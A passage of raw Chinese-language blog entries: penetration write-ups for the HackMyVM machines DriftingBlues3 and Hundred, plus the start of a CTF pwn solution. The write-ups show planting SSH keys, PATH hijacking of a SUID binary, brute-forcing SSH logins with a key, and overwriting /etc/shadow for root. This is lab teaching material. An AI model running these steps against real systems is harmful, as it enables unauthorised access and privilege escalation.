/home/kali/.ssh/driftingblues3.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:7HJQM7N1PtvN21eXihCQ9K63vLuyWBbCe5KWzOKACIM kali@kali</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 4096]----+</span></span><br><span class="line"><span class="string">|      ...        |</span></span><br><span class="line"><span class="string">|       o.        |</span></span><br><span class="line"><span class="string">|        *.. .    |</span></span><br><span class="line"><span class="string">|.   .  o.B o     |</span></span><br><span class="line"><span class="string">|E    o..S.. o   .|</span></span><br><span class="line"><span class="string">|+.  o =oo.   + +o|</span></span><br><span class="line"><span class="string">|o. . O.=o.. o o =|</span></span><br><span class="line"><span class="string">|  o o *+o .. .  +|</span></span><br><span class="line"><span class="string">|   . . .o*+    .o|</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~/.ssh]</span></span><br><span class="line"><span class="string">└─$ cat driftingblues3.pub </span></span><br><span class="line"><span class="string">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDGI9fvAcX5EaDWGh0KtI6SKypvfZM0OG07xqayY/XhkettzEIX2ZSGovnaiVpQCl9i07WK2h+QaYZfulyvqqqx7BbkTP+isWxcVUYl0Avq2i6MJn7OusjH0sukprpa1iCOPqnmQS/oi3vyndNX0wv93T1CZlzpZLPwAlZWq2SrXVRmVpx3cClBm12bxzbWUReBu6P9nr8UsyUbuoAmhCHWR1yIc/T5+t4eqQAIZZdBWGEC9utYW2UvsVrQ8y+O1ADs4pFcrQT0pxLKl2UrDoslN9OT34cV6vYOFBzMFm43V3klYDqTW1LYcU7TuEV5ylC3PoSK1Xwsx3KMqH53qcOzq0DBVhUMvH788Fulin43uY4/pv1m9y9QPYHNm7WdPdBMW71bO5+cBLAtqbRVSGzk6vfhII/CvoMFcGGo2AovWGS/RA+Vx3BxR1vysfzb87OogZKS1stmhHoUIWxT759dUkanpcmpPDTs2A/g1SjIbCoObuJq6ryYvm6t+QZRkHcuuBYGD4lSDTSvFfkCcWtmqB8FDcFnX6B+1Dyw+O3PFk7xklj09m2r16zC8hu0F7HhayB2s9V198ehnnOiI0ATbQga8B4gy+7ZuOb52WPysEQbt1DCDnaogQiC/Ekbrd0TEVRGp1ZoZdCdmZM8LXeFezBTu1oDASmUWB58gvKxSw== kali@kali</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDGI9fvAcX5EaDWGh0KtI6SKypvfZM0OG07xqayY/XhkettzEIX2ZSGovnaiVpQCl9i07WK2h+QaYZfulyvqqqx7BbkTP+isWxcVUYl0Avq2i6MJn7OusjH0sukprpa1iCOPqnmQS/oi3vyndNX0wv93T1CZlzpZLPwAlZWq2SrXVRmVpx3cClBm12bxzbWUReBu6P9nr8UsyUbuoAmhCHWR1yIc/T5+t4eqQAIZZdBWGEC9utYW2UvsVrQ8y+O1ADs4pFcrQT0pxLKl2UrDoslN9OT34cV6vYOFBzMFm43V3klYDqTW1LYcU7TuEV5ylC3PoSK1Xwsx3KMqH53qcOzq0DBVhUMvH788Fulin43uY4/pv1m9y9QPYHNm7WdPdBMW71bO5+cBLAtqbRVSGzk6vfhII/CvoMFcGGo2AovWGS/RA+Vx3BxR1vysfzb87OogZKS1stmhHoUIWxT759dUkanpcmpPDTs2A/g1SjIbCoObuJq6ryYvm6t+QZRkHcuuBYGD4lSDTSvFfkCcWtmqB8FDcFnX6B+1Dyw+O3PFk7xklj09m2r16zC8hu0F7HhayB2s9V198ehnnOiI0ATbQga8B4gy+7ZuOb52WPysEQbt1DCDnaogQiC/Ekbrd0TEVRGp1ZoZdCdmZM8LXeFezBTu1oDASmUWB58gvKxSw== kali@kali&quot;</span> &gt; authorized_keys</span><br></pre></td></tr></table></figure><p>然后本地用私钥登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/.ssh]</span><br><span class="line">└─$ ssh -i driftingblues3 robertj@192.168.56.114</span><br><span class="line">Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">robertj@driftingblues:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">robertj@driftingblues:~$ cat user.txt</span><br><span class="line">413fc08db21285b1f8abea99040b0280</span><br></pre></td></tr></table></figure><p>成功读取 <code>user.txt</code>。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找 SUID 权限文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">robertj@driftingblues:/home$ find / -perm -4000 -type f 2&gt;/dev/null</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/getinfo</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br></pre></td></tr></table></figure><p>下载 <code>getinfo</code> 分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###################\nip address\n###################\n&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;ip a&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###################\nhosts\n###################\n&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cat /etc/hosts&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###################\nos info\n###################\n&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;uname -a&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现它调用了 <code>ip</code>、<code>cat</code>、<code>uname</code>，可以改环境变量劫持命令</p><p>在 <code>/tmp</code> 伪造恶意 <code>ip</code> 命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;cp /bin/bash /tmp/suidbash;chmod 4755 /tmp/suidbash&quot; &gt; /tmp/ip</span><br><span class="line">chmod +x /tmp/ip</span><br><span class="line">export PATH=$PWD:$PATH</span><br><span class="line">getinfo</span><br></pre></td></tr></table></figure><p>执行生成的 <code>/tmp/suidbash</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">robertj@driftingblues:/tmp$ ./suidbash -p</span><br><span class="line">suidbash-5.0# id</span><br><span class="line">uid=1000(robertj) gid=1000(robertj) euid=0(root) groups=1000(robertj),1001(operators)</span><br><span class="line">suidbash-5.0# cd /root</span><br><span class="line">suidbash-5.0# ls</span><br><span class="line">root.txt  upit</span><br><span class="line">suidbash-5.0# cat root.txt</span><br><span class="line">dfb7f604a22928afba370d819b35ec83</span><br></pre></td></tr></table></figure><p>获得 root shell，读取 <code>root.txt</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm-hundred</title>
      <link href="/2025/08/08/hackmyvm-hundred/"/>
      <url>/2025/08/08/hackmyvm-hundred/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nmap -A 192.168.56.113</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-07 03:23 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.113 (192.168.56.113)</span><br><span class="line">Host is up (0.00075s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.56.102</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rwxrwxrwx    1 0        0             435 Aug 02  2021 id_rsa [NSE: writeable]</span><br><span class="line">| -rwxrwxrwx    1 1000     1000         1679 Aug 02  2021 id_rsa.pem [NSE: writeable]</span><br><span class="line">| -rwxrwxrwx    1 1000     1000          451 Aug 02  2021 id_rsa.pub [NSE: writeable]</span><br><span class="line">|_-rwxrwxrwx    1 0        0             187 Aug 02  2021 users.txt [NSE: writeable]</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 ef:28:1f:2a:1a:56:49:9d:77:88:4f:c4:74:56:0f:5c (RSA)</span><br><span class="line">|   256 1d:8d:a0:2e:e9:a3:2d:a1:4d:ec:07:41:75:ce:47:0e (ECDSA)</span><br><span class="line">|_  256 06:80:3b:<span class="built_in">fc</span>:c5:f7:7d:c5:58:26:83:c4:f7:7e:a3:d9 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">|_http-server-header: nginx/1.14.2</span></span><br><span class="line"><span class="string">MAC Address: 08:00:27:7F:07:94 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span></span><br><span class="line"><span class="string">Device type: general purpose|router</span></span><br><span class="line"><span class="string">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span></span><br><span class="line"><span class="string">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   0.75 ms 192.168.56.113 (192.168.56.113)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 8.53 seconds</span></span><br></pre></td></tr></table></figure><p>可以看到存在ftp未授权。登录后下载这四个文件。</p><h2 id="Web-页面分析"><a href="#Web-页面分析" class="headerlink" title="Web 页面分析"></a>Web 页面分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ curl 192.168.56.113                                                                             </span><br><span class="line">&lt;style&gt;</span><br><span class="line">.center &#123;</span><br><span class="line">  display: block;</span><br><span class="line">  margin-left: auto;</span><br><span class="line">  margin-right: auto;</span><br><span class="line">  key: h4ckb1tu5.enc;</span><br><span class="line">  width: 50%;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;logo.jpg&quot;</span> class=<span class="string">&quot;center&quot;</span>&gt; </span><br><span class="line">&lt;h1&gt;Thank you ALL!&lt;/h1&gt;</span><br><span class="line">&lt;h1&gt;100 f*cking VMs!!&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- l4nr3n, <span class="built_in">nice</span> <span class="built_in">dir</span>.--&gt;</span><br></pre></td></tr></table></figure><p>得到几个提示。<br>key: h4ckb1tu5.enc<br>logo.jpg<br>l4nr3n, nice dir.</p><p>图片存在隐写。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ stegseek -wl users.txt logo.jpg </span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: <span class="string">&quot;cromiphi&quot;</span></span><br><span class="line">[i] Original filename: <span class="string">&quot;toyou.txt&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;logo.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">cat</span> logo.jpg.out </span><br><span class="line">d4t4s3c#1</span><br></pre></td></tr></table></figure><p>然后下载并解密这个enc文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ curl 192.168.56.113/h4ckb1tu5.enc</span><br><span class="line">Warning: Binary output can mess up your terminal. Use <span class="string">&quot;--output -&quot;</span> to tell curl to output it to your terminal anyway, or consider <span class="string">&quot;--output &lt;FILE&gt;&quot;</span> to save to a file.</span><br><span class="line">                                                                                                                                                                         </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ wget http://192.168.56.113/h4ckb1tu5.enc</span><br><span class="line">--2025-08-07 03:38:56--  http://192.168.56.113/h4ckb1tu5.enc</span><br><span class="line">Connecting to 192.168.56.113:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 256 [application/octet-stream]</span><br><span class="line">Saving to: ‘h4ckb1tu5.enc’</span><br><span class="line"></span><br><span class="line">h4ckb1tu5.enc                              100%[=====================================================================================&gt;]     256  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2025-08-07 03:38:56 (5.77 MB/s) - ‘h4ckb1tu5.enc’ saved [256/256]</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                         </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">cat</span> h4ckb1tu5.enc </span><br><span class="line">�Jz▒U(&#125;�D�H�����ӊ��TfV����õ�H���aL�$��Eq�2�)]`J���2H�ٽ~����;2�<span class="string">&quot;�����������</span></span><br><span class="line"><span class="string">                                                                          0l</span></span><br><span class="line"><span class="string">                                                                            �u�k</span></span><br><span class="line"><span class="string">                                                                                ���Ul��.C�1��Q�R�Wδ�j&gt;������������</span></span><br><span class="line"><span class="string">�˴&#125;��K����▒J�����i[?����$�܎&quot;</span></span><br><span class="line">                            ���x����J�����=q�Zq���4!�K��e�P</span><br><span class="line">                                                           J&#123;��Q����3�m�Q��▒J��_)���ٶ�Z                                                                                                                                                                         </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ file h4ckb1tu5.enc</span><br><span class="line"></span><br><span class="line">h4ckb1tu5.enc: data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ openssl rsautl -decrypt -inkey id_rsa.pem -<span class="keyword">in</span> h4ckb1tu5.enc -out secret.txt</span><br><span class="line"></span><br><span class="line">The <span class="built_in">command</span> rsautl was deprecated <span class="keyword">in</span> version 3.0. Use <span class="string">&#x27;pkeyutl&#x27;</span> instead.</span><br><span class="line">                                                                                                                                                                         </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ openssl pkeyutl -decrypt -inkey id_rsa.pem -<span class="keyword">in</span> h4ckb1tu5.enc -out secret.txt</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                         </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">cat</span> secret.txt   </span><br><span class="line">/softyhackb4el7dshelldredd</span><br></pre></td></tr></table></figure><hr><h2 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gobuster <span class="built_in">dir</span> -u http://192.168.56.113/softyhackb4el7dshelldredd/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.56.113/softyhackb4el7dshelldredd/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 50</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/id_rsa               (Status: 200) [Size: 1876]</span><br><span class="line">/index.html           (Status: 200) [Size: 26]</span><br><span class="line">Progress: 13842 / 13845 (99.98%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>得到id_rsa。</p><h2 id="私钥登录爆破脚本"><a href="#私钥登录爆破脚本" class="headerlink" title="私钥登录爆破脚本"></a>私钥登录爆破脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> $(<span class="built_in">cat</span> users.txt); <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[*] Trying user: <span class="variable">$user</span>&quot;</span></span><br><span class="line">  ssh -i id_rsa.1 -o StrictHostKeyChecking=no -o ConnectTimeout=3 <span class="string">&quot;<span class="variable">$user</span>@192.168.56.113&quot;</span> <span class="built_in">whoami</span> 2&gt;/dev/null</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Trying user: hmv</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa.1&#x27;</span>: </span><br></pre></td></tr></table></figure><p>使用 stegseek 得到的密码 <code>d4t4s3c#1</code> 成功登录。</p><h2 id="成功登录用户-hmv"><a href="#成功登录用户-hmv" class="headerlink" title="成功登录用户 hmv"></a>成功登录用户 hmv</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hmv@hundred:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(hmv) gid=1000(hmv) <span class="built_in">groups</span>=1000(hmv),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)</span><br></pre></td></tr></table></figure><h2 id="提权阶段"><a href="#提权阶段" class="headerlink" title="提权阶段"></a>提权阶段</h2><p>找了一会没发现啥，然后上传了一个linpeas.sh，发现shadow文件可写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hmv@hundred:/tmp$ <span class="built_in">ls</span> -la /etc/shadow</span><br><span class="line">-rwxrwx-wx 1 root shadow 963 Aug  2  2021 /etc/shadow</span><br></pre></td></tr></table></figure><p>覆盖 shadow 条目，提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hmv@hundred:/tmp$ <span class="built_in">echo</span> <span class="string">&#x27;root:qdbEWfKM1ov2g:18888:0:99999:7:::&#x27;</span> &gt; /etc/shadow</span><br><span class="line">hmv@hundred:/tmp$ su</span><br><span class="line">root@hundred:/tmp# <span class="built_in">cat</span> /root/root.txt </span><br><span class="line">HMVkeephacking</span><br></pre></td></tr></table></figure><p>这里要注意shadow文件与passwd格式问题</p><table><thead><tr><th>项目</th><th>正确格式（shadow）</th><th>错误格式（passwd）</th></tr></thead><tbody><tr><td>内容含义</td><td><code>用户名:加密密码:最后修改天数:最小天数:最大天数:警告天数:禁用天数:过期时间:</code></td><td><code>用户名:加密密码:UID:GID:注释:主目录:Shell</code></td></tr><tr><td>示例</td><td><code>root:qdbEWfKM1ov2g:18888:0:99999:7:::</code></td><td><code>root:IvS7aeT4NzQPM:0:0:root:/root:/bin/bash</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025第九届御网杯半决赛pwn部分题解</title>
      <link href="/2025/07/13/2025%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9Bpwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
      <url>/2025/07/13/2025%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9Bpwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="no-wirte-no-read"><a href="#no-wirte-no-read" class="headerlink" title="no wirte,no read"></a>no wirte,no read</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0xDEAD0000L</span>L, <span class="number">0x1000u</span>, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0xDEAD0000L</span>L, <span class="number">0x1000u</span>);</span><br><span class="line">  sandbox();</span><br><span class="line">  MEMORY[<span class="number">0xDEAD0000</span>]();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接输入shellcode，然后调用。查一下沙盒。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x35 0x06 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0008</span><br><span class="line"> 0002: 0x15 0x05 0x00 0x00000002  if (A == open) goto 